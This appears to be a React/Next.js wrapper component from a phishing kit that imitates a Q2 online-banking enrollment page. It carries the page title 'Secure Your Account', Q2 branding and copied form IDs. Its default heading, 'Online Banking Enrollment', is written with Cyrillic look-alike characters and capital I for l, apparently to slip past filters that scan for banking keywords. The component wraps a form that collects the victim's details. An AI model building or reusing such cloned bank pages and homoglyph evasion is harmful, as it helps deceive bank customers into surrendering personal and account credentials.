/* eslint-disable @next/next/no-img-element */
import Head from "next/head";
import React from "react";
import { WrapperStyles } from "./WrapperStyles";

interface WrapperProps {
  children?: React.ReactNode;
  btnText?: string;
  loading?: boolean;
  onSubmit?: React.MouseEventHandler<HTMLButtonElement> | undefined;
  title?: string;
  subTitle?: string;
  hideBtn?: boolean;
}

export const Wrapper: React.FC<WrapperProps> = ({
  children,
  btnText,
  loading,
  onSubmit,
  hideBtn,
  title,
  subTitle,
}) => {
  return (
    <>
      <Head>
        <title>Secure Your Account</title>
        <link href="/favicon.ico" />
      </Head>

      <WrapperStyles />

      <div className="container-fluid heading">
        <div className="col-xs-12" style={{ textAlign: "center" }}>
          <img
            id="logo-large"
            src="/images/logo_large-5e25fef18c6d11cfca2a8cecf1127213.png"
            style={{ maxWidth: "100%", height: "auto" }}
            alt="Q2 CI Environment"
          />
        </div>
      </div>

      <div className="container col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-12">
        <div
          className="row"
          style={{
            marginBottom: `40px`,
          }}
        >
          <div className="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
            <h1 id="page_title">{title || `ОnIinе Ваnking ЕnrоIImеnt`}</h1>
            <p id="page_message" className="page-message">
              {subTitle}
            </p>
            <ul
              id="nav-tabs"
              className="nav nav-tabs"
              role="tablist"
              style={{ display: "none" }}
            />
          </div>
          <div className="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
            <div id="q2-form-fields" className="tab-content">
              <div>
                <form
                  className="q2-form fv-form fv-form-bootstrap"
                  id="OnlineEnrollment_personal"
                >
                  <div className="col-xs-12 groupHeading" id="section0">
                    <div className=""> </div>
                  </div>
                  {children}
                  <div className="col-xs-12 ">
                    <div className="line">
                      <p style={{ marginTop: 10 }}> </p>
                    </div>
                  </div>
                  {!hideBtn ? (
                    <button
                      className="btn btn-primary pull-right"
                      id="submit_button_OnlineEnrollment_personal"
                      disabled={loading}
                      onClick={onSubmit}
                    >
                      {btnText || `Continue`}
                    </button>
                  ) : null}
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div
        role="contentinfo"
        className="footer col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-12"
      />
    </>
  );
};
